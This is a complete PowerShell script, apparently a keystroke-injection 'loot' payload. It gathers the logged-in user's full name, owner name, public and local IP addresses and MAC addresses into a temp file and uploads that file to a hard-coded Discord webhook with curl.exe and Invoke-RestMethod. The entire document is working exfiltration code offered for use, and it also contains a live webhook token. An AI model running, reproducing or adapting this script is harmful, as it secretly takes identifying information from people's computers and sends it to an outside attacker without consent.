# Define variables
$FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"

# Function to get full name
function Get-FullName {
    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
    catch {
        Write-Error "No name was detected"
        return $env:UserName
    }
    return $fullName
}

# Function to get email
function Get-Email {
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        if (-not $email) {
            throw "No email address found"
        }
        return $email
    }
    catch {
        Write-Error "An email was not found"
        return "No Email Detected"
    }
}

# Invoke functions to populate variables
$fullName = Get-FullName
$email = Get-Email

# Get public IP address
try {
    $computerPubIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
}
catch {
    $computerPubIP = "Error getting Public IP"
}

# Get local IP addresses
$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 |
           Select-Object InterfaceAlias, IPAddress, PrefixOrigin | 
           Format-Table -AutoSize |
           Out-String

# Get MAC addresses
$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" |
       Select-Object Name, MacAddress, Status |
       Format-Table -AutoSize |
       Out-String

# Construct output string
$output = @"
Full Name: $fullName

Email: $email

Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC
"@

# Save output to file
$output > $FileName

# Function to upload to Discord webhook
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    # Replace with your actual Discord webhook URL
    $hookurl = "https://discord.com/api/webhooks/1261009752851484692/B1wpTxDAqPn0aLB8pwU4FH4j1i5iAWFC86__R0DBuiMn96cbFZcx8SWPFTLEOBf-DXb8"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not [string]::IsNullOrEmpty($file)) {
        # Use curl.exe or equivalent command to upload file
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Example usage to upload the generated file to Discord
Upload-Discord -file $FileName
